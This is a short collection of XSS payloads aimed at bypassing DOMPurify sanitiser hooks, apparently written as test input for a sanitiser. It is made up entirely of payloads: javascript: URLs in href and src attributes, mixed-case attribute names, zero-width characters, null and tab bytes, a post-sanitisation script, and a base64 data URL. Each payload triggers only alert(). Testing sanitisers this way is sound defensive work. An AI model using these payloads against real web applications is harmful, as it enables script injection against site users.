# DOMPurify Hook Bypass Attempts

## Attributes that survive afterSanitizeAttributes hook
<a href="safe.html" data-href="javascript:alert('data-href')">Link</a>
<img src="safe.jpg" data-src="javascript:alert('data-src')" />

## Custom attributes that bypass hook checks
<a xhref="javascript:alert('xhref')">Custom href</a>
<img xsrc="javascript:alert('xsrc')" alt="Custom src" />

## Attributes with unusual names
<a HREF="javascript:alert('uppercase')">Upper case</a>
<img SRC="javascript:alert('img-upper')" />
<a hReF="javascript:alert('mixed-case')">Mixed case</a>

## Multiple href/src attributes (first wins)
<a href="safe.html" href="javascript:alert('second-href')">Double href</a>
<img src="safe.jpg" src="javascript:alert('second-src')" />

## Attributes added after hook processing
<a href="safe.html">Link</a><script>document.links[0].href="javascript:alert('post-hook')"</script>

## Attributes with special characters in names  
<a hr‌ef="javascript:alert('zwsp-attr')">ZWSP in attr name</a>
<img s‍rc="javascript:alert('zwj-attr')" />

## HTML that triggers multiple hook calls
<a href="javascript:alert('multi1')"><img src="javascript:alert('multi2')" /></a>

## Malformed attributes that might bypass parsing
<a href="javascript:alert('malformed')" title=>Malformed</a>
<a href=javascript:alert('unquoted')>Unquoted</a>

## Attributes with embedded nulls or controls
<a href="java\x00script:alert('null')">Null byte</a>
<a href="java\x09script:alert('tab')">Tab char</a>

## Base64 in non-data URLs
<a href="data:text/html,PHNjcmlwdD5hbGVydCgnYmFzZTY0Jyk8L3NjcmlwdD4=">Not data URL</a>
<img src="https://example.com/PHNjcmlwdD5hbGVydCgnYmFzZTY0Jyk8L3NjcmlwdD4=" />

## Fragment identifiers with attacks
<a href="#javascript:alert('fragment')">Fragment</a>
<a href="/safe.html#javascript:alert('safe-fragment')">Safe with fragment</a>